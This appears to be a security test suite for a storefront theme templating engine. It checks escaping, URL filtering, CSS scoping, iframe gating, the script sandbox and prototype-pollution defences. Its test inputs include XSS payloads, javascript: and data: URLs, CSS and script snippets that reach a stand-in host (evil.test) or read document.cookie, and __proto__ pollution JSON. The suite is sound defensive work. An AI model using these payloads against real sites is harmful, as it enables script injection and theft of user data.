/**
 * ===========================================================================
 *  A SECTION IS CODE SOMEBODY ELSE WROTE
 * ===========================================================================
 * Every `.storelib` file is written by a creator and rendered on a page other
 * people visit, and part of it is written by whoever fills in the settings.
 * So this suite is adversarial on purpose: each case is a thing an attacker
 * would actually try, and each one is held to what the engine does with it
 * rather than to what it is supposed to do.
 *
 * The shape of the threat, and where each is answered:
 *
 *   A SETTING is filled in through the builder, so it is untrusted input on a
 *   page. Output is escaped; `raw` is the single exception and exists for
 *   richtext, which is sanitised on the way in.
 *
 *   A TEMPLATE is the creator's own code, so it is trusted to say what the
 *   section looks like and trusted with nothing else: no eval, no globals, no
 *   network, no iframe without a declared capability.
 *
 *   A SCHEMA is data that reaches the sidebar and the renderer, so a hostile
 *   one must not be able to reach through either.
 */
import { compileSection, compileTemplate, renderTemplate, scopeCss, checkScript, renderSection } from "../lib/storelib-theme"
import type { RenderContext } from "../lib/storelib-theme/types"

let passed = 0
let failed = 0
const failures: string[] = []
function check(name: string, ok: boolean, detail = "") {
  if (ok) { passed++; console.log(`  ok    ${name}`) }
  else { failed++; failures.push(name); console.log(`  FAIL  ${name}${detail ? `\n        ${detail}` : ""}`) }
}
function section(t: string) { console.log(`\n${t}`) }

const ctx = (settings: Record<string, unknown>): RenderContext => ({
  settings,
  blocks: [],
  theme: { typography: { heading: "Inter" }, radius: { medium: 8 } },
  scheme: { bg: "#fff", text: "#000" },
  page: { template: "index" },
  section: { id: "s1", type: "t" },
  assets: {},
})

/** Render one expression with one setting, and give back what reached the page. */
function out(expr: string, settings: Record<string, unknown>): string {
  const c = compileTemplate(expr, { file: "f" })
  if (c.ok === false) return `__REFUSED__ ${c.errors[0].message}`
  return renderTemplate(c.value, ctx(settings))
}

async function main() {
  // ═══════════════════════════════════════════════════════════════════════
  section("HTML injection through a setting")
  // ═══════════════════════════════════════════════════════════════════════
  {
    const payloads = [
      `<script>alert(1)</script>`,
      `<img src=x onerror=alert(1)>`,
      `"><script>alert(1)</script>`,
      `<svg/onload=alert(1)>`,
      `</title><script>alert(1)</script>`,
      `<iframe src="//evil.test"></iframe>`,
    ]
    /**
     * The test is that no `<` survives INSIDE the value, so nothing the
     * setting holds can start a tag. Looking for the word "onerror" instead
     * would fail on correctly escaped output, because escaping touches
     * `<>&"` and not the letters between them — text that reads like an
     * attribute is text, and this is the assertion that knows the difference.
     */
    const inside = (html: string) => html.slice(html.indexOf(">") + 1, html.lastIndexOf("<"))
    const leaked = payloads.filter((p) => /[<>]/.test(inside(out(`<h2>{{ settings.h }}</h2>`, { h: p }))))
    check("every one of six payloads comes out as text, not as markup", leaked.length === 0, leaked.join(" | "))
    check("and inside an attribute it cannot close the attribute", (() => {
      const html = out(`<a title="{{ settings.h }}">x</a>`, { h: `" onmouseover="alert(1)` })
      const value = html.slice(html.indexOf('title="') + 7, html.indexOf('">'))
      return !value.includes('"') && value.includes("&quot;")
    })())
    check("a setting cannot introduce a tag even when it looks like one already open", (() => {
      const html = out(`<p>{{ settings.h }}</p>`, { h: `<b>bold` })
      return html.includes("&lt;b&gt;")
    })())
  }

  // ═══════════════════════════════════════════════════════════════════════
  section("raw, which is the one way markup reaches a page")
  // ═══════════════════════════════════════════════════════════════════════
  {
    const html = out(`<div>{{ settings.body | raw }}</div>`, { body: `<p>fine</p><script>alert(1)</script>` })
    check("raw does pass markup through, which is why it exists", html.includes("<p>fine</p>"))
    /**
     * And why it is the one filter that has to be spelled out: the sanitising
     * is done when a richtext setting is SAVED, not here. This records what
     * the engine does, so nobody reads `raw` as "safe".
     */
    check("and passes through everything, so the sanitising has to happen on save", html.includes("<script>"))
    check("nothing else in the language does that", (() => {
      const filters = ["upcase", "downcase", "capitalize", "strip", "escape", "json"]
      return filters.every((f) => !out(`{{ settings.b | ${f} }}`, { b: `<script>x</script>` }).includes("<script>"))
    })())
  }

  // ═══════════════════════════════════════════════════════════════════════
  section("javascript: and other schemes in a URL")
  // ═══════════════════════════════════════════════════════════════════════
  {
    const hostile = [
      `javascript:alert(1)`,
      `JaVaScRiPt:alert(1)`,
      ` javascript:alert(1)`,
      `java\tscript:alert(1)`,
      `data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==`,
      `vbscript:msgbox(1)`,
    ]
    const blocked = hostile.filter((u) => {
      const html = out(`<a href="{{ settings.u | url }}">x</a>`, { u })
      return /javascript|vbscript|data:text\/html/i.test(html.replace(/&#\d+;/g, ""))
    })
    check("six hostile URLs are all refused by the url filter", blocked.length === 0, blocked.join(", "))
    check("and the ones people actually use still work", (() => {
      const fine = ["https://example.com/a?b=c#d", "/pages/about", "mailto:a@b.co", "tel:+441234567890", "#section"]
      return fine.every((u) => out(`<a href="{{ settings.u | url }}">x</a>`, { u }).includes(u.replace(/&/g, "&amp;")))
    })())
    check("an unfiltered href is still escaped, so it cannot break the attribute", (() => {
      const html = out(`<a href="{{ settings.u }}">x</a>`, { u: `" onclick="alert(1)` })
      return !/onclick="alert/.test(html)
    })())
  }

  // ═══════════════════════════════════════════════════════════════════════
  section("CSS injection through a setting")
  // ═══════════════════════════════════════════════════════════════════════
  {
    const css = (value: string) => {
      const c = compileSection(
        `<template><div class="x">a</div></template>\n<style>.x { padding: {{ settings.p }}px; }</style>\n<schema>{"type":"t","name":"T","settings":[{"type":"text","id":"p","label":"P"}]}</schema>`,
        { file: "sections/t.storelib" },
      )
      if (c.ok === false) return `__REFUSED__`
      return renderSection({ compiled: c.value, id: "s1", instance: { type: "t", settings: { p: value }, blocks: [] } as never, theme: {}, page: { template: "index" } }).css
    }
    check("a setting cannot close its own rule and open another", !/}|{/.test(css("0 } body { display: none").replace(/^[^{]*\{|\}$/g, "").split("padding:")[1] ?? ""))
    /**
     * The property that matters is that a value cannot END its declaration:
     * with no semicolon it stays one malformed value, which a browser drops
     * whole. The text can still contain what was typed, and that is not a
     * way in — it is one invalid declaration.
     */
    check("a setting cannot end the declaration and start another", (() => {
      const v = css("0; background: url(//evil.test/x)")
      const rule = v.slice(v.indexOf("{"), v.lastIndexOf("}"))
      // One semicolon: the one the template wrote. Two would mean the value
      // had ended its own declaration and begun a second.
      const clean = css("48")
      const control = (clean.slice(clean.indexOf("{"), clean.lastIndexOf("}")).match(/;/g) ?? []).length
      return (rule.match(/;/g) ?? []).length === control
    })())
    check("a setting cannot pull in a stylesheet", !css("0; @import url(//evil.test/x)").includes("@import"))
    check("a setting cannot open an expression", !/</.test(css("0 <style>")))
    check("but an ordinary value still lands", css("48").includes("48"))
  }

  // ═══════════════════════════════════════════════════════════════════════
  section("CSS scoping cannot be escaped")
  // ═══════════════════════════════════════════════════════════════════════
  {
    const scoped = (source: string) => {
      const r = scopeCss(source, { file: "f", line: 1, type: "t" })
      return r.ok === true ? r.value : `__REFUSED__ ${r.errors[0].message}`
    }
    check("a rule on html or body is still scoped to the section", (() => {
      const v = scoped("body { display: none; } html { filter: invert(1); }")
      return !/^body \{/m.test(v) && !/^html \{/m.test(v)
    })())
    check("a universal selector is scoped too", (() => {
      const v = scoped("* { display: none; }")
      return !/^\* \{/m.test(v)
    })())
    check("and :root does not reach the page's variables", (() => {
      const v = scoped(":root { --theme-font-heading: cursive; }")
      return !/^:root \{/m.test(v)
    })())
  }

  // ═══════════════════════════════════════════════════════════════════════
  section("iframes, and the capability that gates them")
  // ═══════════════════════════════════════════════════════════════════════
  {
    const compile = (tpl: string, caps: string[] = []) =>
      compileTemplate(tpl, { file: "f", capabilities: caps as never })
    check("an iframe without the capability is refused", compile(`<iframe src="https://player.vimeo.com/1"></iframe>`).ok === false)
    check("and with the capability but a hardcoded src, still refused", compile(`<iframe src="https://evil.test/x"></iframe>`, ["embed"]).ok === false)
    check("and with a setting that is not run through embed, still refused", compile(`<iframe src="{{ settings.u }}"></iframe>`, ["embed"]).ok === false)
    check("only a declared capability and the embed filter together are allowed", compile(`<iframe src="{{ settings.u | embed }}"></iframe>`, ["embed"]).ok === true)
    check("and embed only lets known players through", (() => {
      const bad = out(`{{ settings.u | embed }}`, { u: "https://evil.test/x" })
      // A real video id: the pattern wants at least six characters, and it is
      // right to, because three is not a YouTube id.
      const good = out(`{{ settings.u | embed }}`, { u: "https://www.youtube.com/watch?v=dQw4w9WgXcQ" })
      return !bad.includes("evil.test") && good.includes("youtube-nocookie.com/embed/dQw4w9WgXcQ")
    })())
    check("an uppercase or spaced-out iframe tag is caught too", compile(`<IFRAME  src="x">`).ok === false && compile(`<iframe\nsrc="x">`).ok === false)
  }

  // ═══════════════════════════════════════════════════════════════════════
  section("The script sandbox")
  // ═══════════════════════════════════════════════════════════════════════
  {
    const refuse = (js: string, caps: string[] = []) => checkScript(js, { file: "f", line: 1, capabilities: caps as never }).ok === false
    check("no fetch", refuse(`export default function (root) { fetch("//evil.test") }`))
    check("no XMLHttpRequest", refuse(`export default function (root) { new XMLHttpRequest() }`))
    check("no document", refuse(`export default function (root) { document.cookie }`))
    check("no window", refuse(`export default function (root) { window.location = "//evil.test" }`))
    check("no eval", refuse(`export default function (root) { eval("1") }`))
    check("no Function constructor", refuse(`export default function (root) { new Function("return 1")() }`))
    check("no import at runtime", refuse(`export default function (root) { import("//evil.test") }`))
    check("no localStorage", refuse(`export default function (root) { localStorage.setItem("a", "b") }`))
    check("no timers without the capability", refuse(`export default function (root) { setTimeout(() => {}, 1) }`))
    check("and timers once it is declared", checkScript(`export default function (root) { setTimeout(() => {}, 1) }`, { file: "f", line: 1, capabilities: ["timers"] as never }).ok === true)
    check("the section's own element is what it does get", checkScript(`export default function (root) { root.querySelectorAll("details") }`, { file: "f", line: 1 }).ok === true)
  }

  // ═══════════════════════════════════════════════════════════════════════
  section("Prototype pollution")
  // ═══════════════════════════════════════════════════════════════════════
  {
    check("a template cannot read __proto__, constructor or prototype", (() => {
      const paths = ["settings.__proto__", "settings.constructor", "settings.__proto__.polluted", "section.constructor.constructor"]
      return paths.every((p) => {
        const html = out(`<p>{{ ${p} }}</p>`, {})
        return html === "<p></p>" || html.startsWith("__REFUSED__")
      })
    })())
    check("a hostile schema cannot pollute Object.prototype through settings resolution", (() => {
      const hostile = `<template><p>{{ settings.a }}</p></template>\n<schema>{"type":"t","name":"T","settings":[{"type":"text","id":"__proto__","label":"X","default":"polluted"},{"type":"text","id":"a","label":"A"}]}</schema>`
      compileSection(hostile, { file: "sections/t.storelib" })
      return ({} as Record<string, unknown>).polluted === undefined && (Object.prototype as Record<string, unknown>).polluted === undefined
    })())
    check("and neither can a hostile instance's settings", (() => {
      const c = compileSection(`<template><p>{{ settings.a }}</p></template>\n<schema>{"type":"t","name":"T","settings":[{"type":"text","id":"a","label":"A"}]}</schema>`, { file: "sections/t.storelib" })
      if (c.ok === false) return false
      renderSection({
        compiled: c.value, id: "s1",
        instance: { type: "t", settings: JSON.parse('{"__proto__":{"polluted":true},"a":"x"}'), blocks: [] } as never,
        theme: {}, page: { template: "index" },
      })
      return ({} as Record<string, unknown>).polluted === undefined
    })())
    check("a block id cannot pollute either", (() => {
      const c = compileSection(`<template>{% for b in blocks %}<p>{{ b.settings.t }}</p>{% endfor %}</template>\n<schema>{"type":"t","name":"T","settings":[],"blocks":[{"type":"r","name":"R","settings":[{"type":"text","id":"t","label":"T"}]}]}</schema>`, { file: "sections/t.storelib" })
      if (c.ok === false) return false
      renderSection({
        compiled: c.value, id: "s1",
        instance: { type: "t", settings: {}, blocks: [{ id: "__proto__", type: "r", settings: JSON.parse('{"__proto__":{"bad":1},"t":"x"}') }] } as never,
        theme: {}, page: { template: "index" },
      })
      return ({} as Record<string, unknown>).bad === undefined
    })())
  }

  // ═══════════════════════════════════════════════════════════════════════
  section("A hostile schema")
  // ═══════════════════════════════════════════════════════════════════════
  {
    const compile = (schema: unknown) =>
      compileSection(`<template><p>a</p></template>\n<schema>${JSON.stringify(schema)}</schema>`, { file: "sections/t.storelib" })
    check("a setting type the engine does not have is refused", compile({ type: "t", name: "T", settings: [{ type: "exec", id: "a", label: "A" }] }).ok === false)
    check("a type that disagrees with the file name is refused", compile({ type: "other", name: "T", settings: [] }).ok === false || compileSection(`<template><p>a</p></template>\n<schema>{"type":"other","name":"T","settings":[]}</schema>`, { file: "sections/t.storelib", expectType: "t" }).ok === false)
    check("a schema far past the settings limit is refused", compile({ type: "t", name: "T", settings: Array.from({ length: 400 }, (_, i) => ({ type: "text", id: `f${i}`, label: "L" })) }).ok === false)
    check("a name long enough to break a sidebar is refused", compile({ type: "t", name: "x".repeat(500), settings: [] }).ok === false)
    check("a default of the wrong type for its control is refused", compile({ type: "t", name: "T", settings: [{ type: "checkbox", id: "a", label: "A", default: "<script>" }] }).ok === false)
    check("and a section that is fine is still fine", compile({ type: "t", name: "T", settings: [{ type: "text", id: "a", label: "A" }] }).ok === true)
  }

  console.log(`\n${passed} passed, ${failed} failed`)
  if (failed > 0) { console.log(`\nFailed:\n${failures.map((f) => `  - ${f}`).join("\n")}`); process.exit(1) }
}

void main()
